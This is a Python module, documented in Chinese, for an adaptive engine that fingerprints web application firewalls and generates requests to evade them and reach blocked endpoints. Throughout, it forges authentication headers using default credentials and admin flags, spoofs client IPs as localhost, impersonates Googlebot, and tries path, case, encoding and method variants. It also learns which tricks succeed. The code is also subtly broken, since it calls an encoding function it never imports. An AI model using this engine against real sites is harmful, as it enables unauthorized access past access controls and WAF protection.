"""
智能Bypass响应式策略引擎

增强功能：
1. 基于响应内容的动态策略选择
2. WAF特征识别与绕过
3. 历史成功记录与自适应学习
4. 置信度评分排序
"""

import re
import logging
from typing import Dict, List, Set, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
from collections import defaultdict

logger = logging.getLogger(__name__)


class BypassStrategy(Enum):
    """Bypass策略类型"""
    HEADER_MANIPULATION = "header_manipulation"
    PATH_VARIATION = "path_variation"
    METHOD_SWITCH = "method_switch"
    PARAMETER_TAMPERING = "parameter_tampering"
    AUTH_INJECTION = "auth_injection"
    CONTENT_TYPE_SWITCH = "content_type_switch"
    CASE_NORMALIZATION = "case_normalization"
    ENCODING_TRICK = "encoding_trick"
    PROTOCOL_TRICK = "protocol_trick"
    TIMING_ATTACK = "timing_attack"


@dataclass
class BypassAttempt:
    """Bypass尝试记录"""
    strategy: BypassStrategy
    technique: str
    request_config: Dict
    response_code: int
    response_size: int
    response_time: float
    bypassed: bool
    new_content: bool
    error_message: Optional[str] = None


@dataclass
class StrategyResult:
    """策略执行结果"""
    strategy: BypassStrategy
    succeeded: bool
    bypassed_response: Optional[Dict] = None
    attempts: int = 0
    confidence: float = 0.0
    notes: str = ""


class WAFSignature:
    """WAF特征签名"""
    
    CLOUDFLARE_PATTERNS = [
        r'Cloudflare',
        r'Ray ID',
        r'__cfduid',
        r'cf-ray',
        r'cloudflare',
        r' attention required',
        r'Cloudflare Ray ID',
    ]
    
    AKAMAI_PATTERNS = [
        r'Akamai',
        r'akamai',
        r'Reference',
        r'Access denied',
    ]
    
    AWS_WAF_PATTERNS = [
        r'AWS WAF',
        r'aws-waf',
        r'webacl',
        r'Missing required',
    ]
    
    MODSECURITY_PATTERNS = [
        r'ModSecurity',
        r'ModSecurity',
        r'Request blocked',
        r'This request was blocked',
    ]
    
    F5_BIGIP_PATTERNS = [
        r'F5 Networks',
        r'Big-IP',
        r'BIG-IP',
        r'Traffic',
    ]
    
    GENERIC_BLOCK_PATTERNS = [
        r'access denied',
        r'request blocked',
        r'forbidden',
        r'blocked',
        r'security policy',
        r'not allowed',
        r'rate limit',
        r'too many requests',
    ]

    @classmethod
    def detect_waf(cls, response_content: str, headers: Dict) -> Optional[str]:
        """检测WAF类型"""
        content_lower = response_content.lower()
        headers_str = str(headers).lower()

        for pattern in cls.CLOUDFLARE_PATTERNS:
            if re.search(pattern, response_content, re.IGNORECASE):
                return "Cloudflare"

        for pattern in cls.AKAMAI_PATTERNS:
            if re.search(pattern, response_content, re.IGNORECASE):
                return "Akamai"

        for pattern in cls.AWS_WAF_PATTERNS:
            if re.search(pattern, response_content, re.IGNORECASE):
                return "AWS WAF"

        for pattern in cls.MODSECURITY_PATTERNS:
            if re.search(pattern, response_content, re.IGNORECASE):
                return "ModSecurity"

        for pattern in cls.F5_BIGIP_PATTERNS:
            if re.search(pattern, response_content, re.IGNORECASE):
                return "F5 BIG-IP"

        if any(re.search(p, content_lower) for p in cls.GENERIC_BLOCK_PATTERNS):
            if 'cf-ray' in headers_str or 'cfduid' in headers_str:
                return "Cloudflare"
            return "Generic WAF"

        return None


class ResponseAnalyzer:
    """响应内容分析器"""

    EMPTY_BODY_CODES = {204, 304}
    
    NORMAL_ERROR_CODES = {400, 401, 403, 404, 500, 502, 503, 504}
    
    NORMAL_ERROR_PATTERNS = [
        r'not found',
        r'error',
        r'invalid',
        r'missing',
        r'failed',
    ]

    @classmethod
    def is_blocked_response(cls, status_code: int, content: str, headers: Dict) -> Tuple[bool, str]:
        """
        判断是否为被拦截的响应
        
        Returns:
            (is_blocked, reason)
        """
        if status_code in cls.EMPTY_BODY_CODES:
            return False, "empty_response"

        if status_code == 403:
            waf_type = WAFSignature.detect_waf(content, headers)
            if waf_type:
                return True, f"waf_{waf_type.lower().replace(' ', '_')}"
            
            if any(p in content.lower() for p in ['blocked', 'denied', 'forbidden', 'access denied']):
                return True, "generic_403_block"

        if status_code == 401:
            if 'token' in content.lower() or 'auth' in content.lower():
                return True, "auth_required"

        if status_code == 429:
            return True, "rate_limited"

        if status_code >= 500:
            return False, "server_error"

        if len(content) < 50 and status_code in cls.NORMAL_ERROR_CODES:
            return True, "minimal_error_page"

        return False, "not_blocked"

    @classmethod
    def extract_error_info(cls, content: str) -> Dict[str, Any]:
        """提取错误响应中的信息"""
        info = {
            'has_error_message': False,
            'error_type': None,
            'suggests_auth': False,
            'suggests_params': False,
        }

        content_lower = content.lower()

        if 'login' in content_lower or 'auth' in content_lower or 'token' in content_lower:
            info['suggests_auth'] = True

        if 'param' in content_lower or 'missing' in content_lower or 'required' in content_lower:
            info['suggests_params'] = True

        error_match = re.search(r'"error"\s*:\s*"([^"]+)"', content)
        if error_match:
            info['has_error_message'] = True
            info['error_type'] = error_match.group(1)

        return info


class SmartBypassEngine:
    """
    智能Bypass引擎
    
    根据响应特征动态选择最优绕过策略
    """

    STATUS_STRATEGY_MAP = {
        401: [BypassStrategy.AUTH_INJECTION, BypassStrategy.HEADER_MANIPULATION],
        403: [
            BypassStrategy.CASE_NORMALIZATION,
            BypassStrategy.PATH_VARIATION,
            BypassStrategy.HEADER_MANIPULATION,
            BypassStrategy.ENCODING_TRICK,
        ],
        404: [
            BypassStrategy.PATH_VARIATION,
            BypassStrategy.PARAMETER_TAMPERING,
        ],
        405: [BypassStrategy.METHOD_SWITCH, BypassStrategy.CONTENT_TYPE_SWITCH],
        429: [BypassStrategy.TIMING_ATTACK, BypassStrategy.HEADER_MANIPULATION],
        400: [BypassStrategy.PARAMETER_TAMPERING, BypassStrategy.CONTENT_TYPE_SWITCH],
    }

    WAF_BYPASS_STRATEGIES = {
        "Cloudflare": [
            BypassStrategy.HEADER_MANIPULATION,
            BypassStrategy.ENCODING_TRICK,
            BypassStrategy.CASE_NORMALIZATION,
        ],
        "Akamai": [
            BypassStrategy.PATH_VARIATION,
            BypassStrategy.PARAMETER_TAMPERING,
        ],
        "AWS WAF": [
            BypassStrategy.AUTH_INJECTION,
            BypassStrategy.HEADER_MANIPULATION,
        ],
        "ModSecurity": [
            BypassStrategy.ENCODING_TRICK,
            BypassStrategy.PATH_VARIATION,
        ],
        "Generic WAF": [
            BypassStrategy.PATH_VARIATION,
            BypassStrategy.CASE_NORMALIZATION,
            BypassStrategy.ENCODING_TRICK,
        ],
    }

    def __init__(self):
        self.successful_bypasses: Dict[str, List[BypassAttempt]] = defaultdict(list)
        self.failed_count: Dict[str, int] = defaultdict(int)
        self.waf_detected: Optional[str] = None
        self._history_enabled = True

    def analyze_response(
        self,
        url: str,
        method: str,
        status_code: int,
        content: str,
        headers: Dict
    ) -> Tuple[bool, str, List[BypassStrategy]]:
        """
        分析响应并决定是否需要Bypass
        
        Returns:
            (should_bypass, reason, recommended_strategies)
        """
        is_blocked, reason = ResponseAnalyzer.is_blocked_response(status_code, content, headers)

        if is_blocked:
            self.waf_detected = WAFSignature.detect_waf(content, headers)

        strategies = self._select_strategies(status_code, reason, self.waf_detected)

        return is_blocked, reason, strategies

    def _select_strategies(
        self,
        status_code: int,
        reason: str,
        waf_type: Optional[str]
    ) -> List[BypassStrategy]:
        """选择Bypass策略"""
        strategies = []

        if waf_type and waf_type in self.WAF_BYPASS_STRATEGIES:
            strategies.extend(self.WAF_BYPASS_STRATEGIES[waf_type])

        if status_code in self.STATUS_STRATEGY_MAP:
            for s in self.STATUS_STRATEGY_MAP[status_code]:
                if s not in strategies:
                    strategies.append(s)

        if 'auth' in reason:
            if BypassStrategy.AUTH_INJECTION not in strategies:
                strategies.insert(0, BypassStrategy.AUTH_INJECTION)

        if 'waf' in reason:
            if BypassStrategy.ENCODING_TRICK not in strategies:
                strategies.append(BypassStrategy.ENCODING_TRICK)

        if not strategies:
            strategies = list(BypassStrategy)

        return strategies[:4]

    def generate_bypass_requests(
        self,
        url: str,
        method: str,
        strategies: List[BypassStrategy],
        original_headers: Optional[Dict] = None,
        original_params: Optional[Dict] = None
    ) -> List[Dict[str, Any]]:
        """生成绕过请求配置"""
        requests = []
        headers = original_headers or {}
        params = original_params or {}

        for strategy in strategies:
            if strategy == BypassStrategy.AUTH_INJECTION:
                requests.extend(self._gen_auth_bypass(url, method, headers))

            elif strategy == BypassStrategy.HEADER_MANIPULATION:
                requests.extend(self._gen_header_manipulation(url, method, headers))

            elif strategy == BypassStrategy.CASE_NORMALIZATION:
                requests.extend(self._gen_case_variation(url, method))

            elif strategy == BypassStrategy.PATH_VARIATION:
                requests.extend(self._gen_path_variation(url, method))

            elif strategy == BypassStrategy.METHOD_SWITCH:
                requests.extend(self._gen_method_switch(url))

            elif strategy == BypassStrategy.PARAMETER_TAMPERING:
                requests.extend(self._gen_param_tampering(url, method, params))

            elif strategy == BypassStrategy.ENCODING_TRICK:
                requests.extend(self._gen_encoding_trick(url, method))

        return requests

    def _gen_auth_bypass(self, url: str, method: str, headers: Dict) -> List[Dict]:
        """生成认证绕过请求"""
        bypass_configs = []

        auth_headers_list = [
            {'Authorization': 'Bearer test'},
            {'Authorization': 'Basic dGVzdDp0ZXN0'},
            {'Authorization': 'Basic YWRtaW46YWRtaW4='},
            {'X-API-Key': 'test-api-key'},
            {'X-Auth-Token': 'test-token'},
            {'Cookie': 'token=test; admin=1'},
            {'X-User-ID': '1'},
            {'X-Admin': '1'},
        ]

        for auth_header in auth_headers_list:
            new_headers = {**headers, **auth_header}
            bypass_configs.append({
                'url': url,
                'method': method,
                'headers': new_headers,
                'strategy': BypassStrategy.AUTH_INJECTION,
            })

        return bypass_configs

    def _gen_header_manipulation(self, url: str, method: str, headers: Dict) -> List[Dict]:
        """生成Header操作请求"""
        bypass_configs = []

        header_variations = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forwarded-For': 'localhost'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Host': 'localhost'},
            {'X-HTTP-Host': 'localhost'},
            {'Referer': url},
            {'Origin': 'https://localhost'},
            {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'},
            {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
        ]

        for header_set in header_variations:
            new_headers = {**headers, **header_set}
            bypass_configs.append({
                'url': url,
                'method': method,
                'headers': new_headers,
                'strategy': BypassStrategy.HEADER_MANIPULATION,
            })

        return bypass_configs

    def _gen_case_variation(self, url: str, method: str) -> List[Dict]:
        """生成大小写变化请求"""
        bypass_configs = []

        parsed = urlparse(url)
        path = parsed.path

        segments = path.split('/')
        for i, segment in enumerate(segments):
            if segment and segment.lower() not in ['api', 'v1', 'v2', 'v3', 'rest']:
                original = segment
                variations = [
                    segment.upper(),
                    segment.lower(),
                    segment.capitalize(),
                    ''.join(c.upper() if j % 2 == 0 else c.lower() for j, c in enumerate(segment)),
                ]

                for var in set(variations):
                    if var != original:
                        new_segments = segments[:i] + [var] + segments[i+1:]
                        new_path = '/'.join(new_segments)
                        new_url = f"{parsed.scheme}://{parsed.netloc}{new_path}"
                        if parsed.query:
                            new_url += f"?{parsed.query}"

                        bypass_configs.append({
                            'url': new_url,
                            'method': method,
                            'strategy': BypassStrategy.CASE_NORMALIZATION,
                        })

        return bypass_configs[:10]

    def _gen_path_variation(self, url: str, method: str) -> List[Dict]:
        """生成路径变化请求"""
        bypass_configs = []

        parsed = urlparse(url)
        path = parsed.path.rstrip('/')

        variations = [
            path + '/',
            path + '.json',
            path + '.xml',
            path + '/../' + path.split('/')[-1],
            path.replace('/api/', '/Api/'),
            path.replace('/api/', '/api/v1/'),
            path.replace('/v1/', '/v2/'),
        ]

        for var_path in set(variations):
            if var_path != path:
                new_url = f"{parsed.scheme}://{parsed.netloc}{var_path}"
                if parsed.query:
                    new_url += f"?{parsed.query}"

                bypass_configs.append({
                    'url': new_url,
                    'method': method,
                    'strategy': BypassStrategy.PATH_VARIATION,
                })

        return bypass_configs[:10]

    def _gen_method_switch(self, url: str) -> List[Dict]:
        """生成方法切换请求"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']

        return [
            {'url': url, 'method': m, 'strategy': BypassStrategy.METHOD_SWITCH}
            for m in methods
        ]

    def _gen_param_tampering(self, url: str, method: str, params: Dict) -> List[Dict]:
        """生成参数篡改请求"""
        bypass_configs = []

        param_variations = [
            {**params, '_': ''},
            {**params, 'debug': '1'},
            {**params, 'test': '1'},
            {**params, 'mode': 'debug'},
        ]

        for var_params in param_variations:
            bypass_configs.append({
                'url': url,
                'method': method,
                'params': var_params,
                'strategy': BypassStrategy.PARAMETER_TAMPERING,
            })

        return bypass_configs

    def _gen_encoding_trick(self, url: str, method: str) -> List[Dict]:
        """生成编码 tricks 请求"""
        bypass_configs = []

        parsed = urlparse(url)
        path = parsed.path

        path_variations = [
            quote(path),
            quote(quote(path)),
            path.replace('/', '/%2f'),
        ]

        for var_path in path_variations:
            new_url = f"{parsed.scheme}://{parsed.netloc}{var_path}"
            if parsed.query:
                new_url += f"?{parsed.query}"

            bypass_configs.append({
                'url': new_url,
                'method': method,
                'strategy': BypassStrategy.ENCODING_TRICK,
            })

        return bypass_configs

    def record_attempt(self, key: str, attempt: BypassAttempt):
        """记录尝试结果"""
        if attempt.bypassed:
            self.successful_bypasses[key].append(attempt)
        else:
            self.failed_count[key] += 1

    def get_best_strategy(self, key: str) -> Optional[BypassStrategy]:
        """获取历史上最成功的策略"""
        if key not in self.successful_bypasses:
            return None

        attempts = self.successful_bypasses[key]
        strategy_counts: Dict[BypassStrategy, int] = defaultdict(int)

        for attempt in attempts:
            strategy_counts[attempt.strategy] += 1

        if strategy_counts:
            return max(strategy_counts.items(), key=lambda x: x[1])[0]

        return None

    def should_continue(self, key: str, max_attempts: int = 20) -> bool:
        """判断是否应该继续尝试"""
        if key in self.successful_bypasses and len(self.successful_bypasses[key]) > 0:
            return True

        return self.failed_count[key] < max_attempts


from urllib.parse import urlparse


def create_smart_bypass_engine() -> SmartBypassEngine:
    """创建智能Bypass引擎"""
    return SmartBypassEngine()
